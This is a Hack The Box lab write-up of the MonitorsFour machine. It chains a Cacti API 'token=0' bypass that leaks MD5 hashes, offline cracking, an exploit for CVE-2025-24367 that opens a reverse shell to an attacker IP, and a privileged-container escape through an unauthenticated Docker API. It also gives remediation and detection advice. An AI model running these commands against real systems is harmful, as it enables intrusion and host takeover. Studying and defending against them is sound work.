---
title: "MonitorsFour — Cacti API Token Bypass to Privileged Docker Escape"
description: "An API access-control flaw exposes password hashes, and an unauthenticated Docker daemon allows a privileged container escape to host root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - docker
  - cacti
  - api
  - container-escape
objective: "Escalate from an unauthenticated API access-control bypass to host root through a Docker daemon exposed without authentication."
tools:
  - rustscan
  - curl
  - hashcat
  - username-anarchy
  - Burp Suite
skill: "Containerized application exploitation and unauthenticated Docker daemon abuse"
outcome: "Authenticated Cacti code execution as www-data inside the container and host root via a privileged container created through the unauthenticated Docker API"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Linux host running a Cacti 1.2.28 monitoring instance inside a Docker container |
| Starting position | Unauthenticated network access |
| Objective | Turn an exposed Cacti API into authenticated access and code execution, then reach the underlying host through the Docker daemon API |
| Outcome | Code execution as `www-data` inside the container and root on the underlying host |

## From token bypass to privileged Docker escape

MonitorsFour is a Medium-rated Hack The Box Linux lab that runs Cacti network monitoring inside a Docker container. A broken access-control check on the Cacti API accepts `token=0` and returns account records with raw MD5 password hashes to unauthenticated callers. That disclosure gave me four hashes to attack offline; one cracked. Username permutations generated from the full names returned by the same API then yielded a working Cacti login. With authenticated access, CVE-2025-24367 provides code execution as `www-data` inside the container. From there an unauthenticated Docker daemon API on an internal address allows a privileged container with the host filesystem mounted, returning root on the host. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/). Flag values are omitted.

**Attack path:** **API access-control bypass (`token=0`) → MD5 hash disclosure → offline cracking → username generation → Cacti authentication → CVE-2025-24367 container RCE → unauthenticated Docker daemon → privileged container with host mount → host root**

## Target, discovery, and objective

- **Target:** a Cacti 1.2.28 monitoring instance deployed in Docker on a Linux host.
- **Discovery:** port scanning surfaced the HTTP service, and the Cacti application was reached over a virtual host.
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** convert an exposed API into authenticated Cacti access, obtain code execution inside the container, and reach the underlying host through the Docker API.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: API bypass to container escape

### 1. API access-control bypass and hash disclosure

Observation: the Cacti API exposes an `/api/v1/user` endpoint that takes a `token` parameter. I checked the parameter first: `token=0` is accepted without credentials and returns user records.

```bash
for i in $(seq 1 1000); do
    result=$(curl -s "http://<TARGET_HOSTNAME>/api/v1/user?token=0&id=$i")
    if ! echo "$result" | grep -q '"error"'; then
        echo "ID $i: $result"
    fi
done
```

Iterating the `id` range returns four account records, each carrying a raw MD5 password hash:

```text
<API_ACCOUNT>:<MD5_HASH_1>
<LAB_USER_1>:<MD5_HASH_2>
<LAB_USER_2>:<MD5_HASH_3>
<LAB_USER_3>:<MD5_HASH_4>
```

Significance: `token=0` is treated as a valid token, so the endpoint performs no caller authentication and returns credential material to anyone who can reach it.

Result: four account records, including MD5 password hashes, are retrieved without authentication.

### 2. Offline hash cracking

Observation: the disclosed hashes are raw MD5, so a wordlist attack offline is fast.

```bash
hashcat -m 0 hashes.txt <WORDLIST> -D2 -w4
```

One hash resolves to a plaintext password:

```text
<MD5_HASH_1>:<API_ACCOUNT_PASSWORD>
```

Significance: raw MD5 offers no meaningful resistance to wordlist cracking, and the recovered value is a reusable credential.

Result: one account password is recovered from the disclosed hash.

### 3. Username generation and Cacti authentication

Observation: the Cacti login rejects `<API_ACCOUNT>` as a username, but the same API also returns each account's full name.

```bash
./username-anarchy -i names.list > usernames.anarchy
```

The generated permutations are tested against the login form (Burp Intruder), and one pairing authenticates.

Significance: application login names differ from API account names, so the recovered password only becomes usable after username generation and systematic testing.

Result: authenticated access to the Cacti application is obtained as `<VALID_APPLICATION_USER>` using the recovered password.

### 4. Cacti authenticated RCE: CVE-2025-24367

Observation: Cacti 1.2.28 is affected by CVE-2025-24367, in which an authenticated user abuses graph and template functionality to write arbitrary PHP into the application web root.

```bash
python3 exploit.py \
  -u '<VALID_APPLICATION_USER>' -p '<API_ACCOUNT_PASSWORD>' \
  -i '<ATTACKER_IP>' -l '<SHELL_PORT>' \
  --url 'http://<APPLICATION_HOSTNAME>'
```

Significance: the flaw converts authenticated access into remote code execution inside the Cacti container, bounded by the account the web service runs as.

Result: an interactive reverse shell runs as `www-data` inside the Docker container.

### 5. Unauthenticated Docker daemon API exposure

Observation: from inside the container, the Docker daemon API is reachable over TCP on port 2375 at an internal address without authentication.

```bash
curl -s http://<DOCKER_API_HOST>:2375/version | python3 -m json.tool
```

```text
"Version": "28.3.2"
```

Significance: an unauthenticated Docker daemon is effectively root on the host, because any caller that can reach it can direct the daemon to run workloads.

Result: the daemon answered without authentication and reported Docker 28.3.2.

### 6. Privileged container escape

Observation: the same unauthenticated API can list local images and accept a new container definition, so a privileged container can be created with the host filesystem bound into it.

```bash
curl -s http://<DOCKER_API_HOST>:2375/images/json
curl -s -X POST -H "Content-Type: application/json" \
  -d @<CONTAINER_SPEC> \
  http://<DOCKER_API_HOST>:2375/containers/create
curl -s -X POST http://<DOCKER_API_HOST>:2375/containers/<CONTAINER_ID>/start
```

The image list includes an application image already present on the host:

```text
<APPLICATION_IMAGE>
```

The container spec selects an image already present on the host, enables privileged mode, and binds the host root filesystem into the container (summarized, not literal).

Significance: privileged mode combined with a host-filesystem bind removes the container boundary entirely, so code running in the new container runs on the host.

Result: the documentation records a root shell on the host with the host filesystem mounted at `/host`; the shell output was not retained, so I could not verify it directly.

## One obstacle: the rejected account name

| Challenge | Decision | Rationale |
|---|---|---|
| The recovered credential's account name was rejected at the Cacti login | Generate username permutations from the API-returned full names and test them | Application login names differ from API account names |

## Outcome: container RCE and host root

The documented path reaches authenticated Cacti code execution as `www-data` inside the container and host root through a privileged container created via the unauthenticated Docker API; the exposed Docker daemon on an internal address was the critical control failure.

## Recommendations: the daemon, the token check, MD5, and the CVE

The lab did not test remediation. The following measures are recommendations.

1. **Unauthenticated Docker daemon API.** Root cause: the daemon is exposed on TCP port 2375 without TLS client authentication. Demonstrated impact: any caller that can reach the API can create a privileged container with the host filesystem mounted, which is equivalent to root on the host. *Recommendation:* use the local Unix socket or mutual TLS for remote access, and never expose the daemon without authentication. *Detection:* alert on remote Docker API access and on creation of privileged containers.
2. **Broken API token validation.** Root cause: the endpoint accepts `token=0` as an authenticated value. Demonstrated impact: unauthenticated retrieval of password hashes. *Recommendation:* validate the caller identity server-side and reject trivially bypassed token values, then rotate any exposed secrets. *Detection:* flag unauthenticated responses that contain credential fields.
3. **MD5 password storage and reuse.** Root cause: passwords are stored as raw MD5 and one password is reused between the API account and the application login. Demonstrated impact: fast offline cracking and credential reuse within the same application. *Recommendation:* store passwords with a salted adaptive hash and enforce unique credentials. *Detection:* monitor for password reuse across accounts.
4. **Cacti authenticated RCE (CVE-2025-24367).** Root cause: an authenticated user can create arbitrary PHP in the web root, fixed in Cacti 1.2.29. Demonstrated impact: code execution inside the container as the web service account. *Recommendation:* upgrade to the patched release and restrict access to the Cacti interface to a management network.

## References

- [Hack The Box — MonitorsFour](https://app.hackthebox.com/machines/MonitorsFour)
- [NVD — CVE-2025-24367](https://nvd.nist.gov/vuln/detail/CVE-2025-24367)
- [Cacti Security Advisory GHSA-fxrq-fr7h-9rqq](https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq) (authenticated PHP creation in the web root, fixed in 1.2.29)
- [RustScan](https://github.com/RustScan/RustScan) (port scanning)
- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery)
- [username-anarchy](https://github.com/urbanadventurer/username-anarchy) (username permutation generation)
- [Docker — Protect the Docker daemon socket](https://docs.docker.com/engine/security/protect-access/) (TLS client authentication for the daemon API)
